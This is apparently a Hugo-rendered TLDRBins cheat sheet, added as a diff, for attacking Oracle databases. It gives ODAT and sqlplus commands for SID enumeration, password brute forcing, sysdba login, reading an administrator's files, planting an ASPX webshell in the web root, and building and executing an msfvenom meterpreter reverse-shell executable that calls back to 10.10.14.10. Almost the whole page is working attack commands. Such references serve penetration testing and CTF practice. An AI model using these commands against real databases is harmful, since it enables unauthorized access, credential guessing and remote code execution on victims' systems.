@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Oracle Database | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/oracle/">
+      <span>Oracle Database</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@oracle/">Oracle</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@database/">Database</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@1521/">1521</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@sqlplus/">Sqlplus</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@odat/">Odat</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@revshell/">Revshell</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@rce/">Rce</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="tools">Tools</h3>
+<h4 id="sqlplus">sqlplus</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Install</span>
+</span></span><span class="line"><span class="cl">sudo apt install oracle-instantclient-sqlplus
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># export LD_LIBRARY_PATH</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/usr/lib/oracle/19.6/client64/lib<span class="si">${</span><span class="nv">LD_LIBRARY_PATH</span><span class="p">:+:</span><span class="nv">$LD_LIBRARY_PATH</span><span class="si">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
+</span></span><span class="line"><span class="cl">sqlplus -V
+</span></span></code></pre></div><h4 id="odat-oracle-database-attacking-tool">ODAT (Oracle Database Attacking Tool)</h4>
+<p><a href="https://github.com/quentinhardy/odat">Download ODAT</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Install</span>
+</span></span><span class="line"><span class="cl">sudo apt install odat
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
+</span></span><span class="line"><span class="cl">odat --version
+</span></span></code></pre></div><br>
+<hr>
+<h3 id="enum">Enum</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># SID enum (You only need one)</span>
+</span></span><span class="line"><span class="cl">odat sidguesser -s 10.10.11.10
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># User/Password brute force</span>
+</span></span><span class="line"><span class="cl">odat passwordguesser -s 10.10.11.10 -d SID --accounts-file accounts.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Run all checks with creds as sysdba</span>
+</span></span><span class="line"><span class="cl">odat all -s 10.10.11.10 -U username -P password -d SID --sysdba
+</span></span></code></pre></div><h3 id="general">General</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Export everytime or add to ~/.zshrc</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/usr/lib/oracle/19.6/client64/lib<span class="si">${</span><span class="nv">LD_LIBRARY_PATH</span><span class="p">:+:</span><span class="nv">$LD_LIBRARY_PATH</span><span class="si">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Connect</span>
+</span></span><span class="line"><span class="cl">sqlplus uesr/password@10.10.11.10:1521/SID
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Connect as sysdba (sudo)</span>
+</span></span><span class="line"><span class="cl">sqlplus uesr/password@10.10.11.10:1521/SID as sysdba
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check privilege</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> * from user_role_privs<span class="p">;</span>
+</span></span></code></pre></div><br>
+<hr>
+<h3 id="privesc">Privesc</h3>
+<h4 id="arbitrary-read">Arbitrary Read</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">odat ctxsys -s 10.10.11.10 -U username -P password -d SID --sysdba --getFile c:<span class="se">\\</span>users<span class="se">\\</span>administrator<span class="se">\\</span>desktop<span class="se">\\</span>file.txt
+</span></span></code></pre></div><h4 id="upload-file-to-rce">Upload File to RCE</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">odat dbmsadvisor -s 10.10.11.10 -U username -P password -d SID --sysdba --putFile C:<span class="se">\\</span>inetpub<span class="se">\\</span>wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx
+</span></span></code></pre></div><h4 id="execute-binary-to-rce">Execute binary to RCE</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create a malicious exe</span>
+</span></span><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f exe -o revshell.exe
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Upload</span>
+</span></span><span class="line"><span class="cl">odat utlfile -s 10.10.11.10 -U username -P password -d SID --sysdba --putFile <span class="se">\\</span>Temp revshell.exe revshell.exe
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Execute</span>
+</span></span><span class="line"><span class="cl">odat externaltable -s 10.10.11.10 -U username -P password -d SID --sysdba --exec <span class="se">\\</span>Temp revshell.exe
+</span></span></code></pre></div><br></div></div>
+    
+    <script src="/js/utils.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
